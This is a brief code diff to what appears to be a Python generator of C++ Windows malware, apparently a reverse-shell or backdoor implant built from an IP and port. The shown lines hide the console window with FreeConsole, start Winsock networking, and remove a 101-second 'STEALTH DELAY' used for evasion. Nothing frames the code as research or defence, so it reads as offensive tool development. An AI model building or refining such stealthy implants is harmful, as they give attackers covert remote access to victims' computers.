@@ -30,8 +30,6 @@ def generate_cpp_source(ip, port):
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
 
     FreeConsole();
-    // STEALTH DELAY (101 Seconds)
-    Sleep(101000); 
 
     // WINSOCK STARTUP
     WSADATA wsaData;
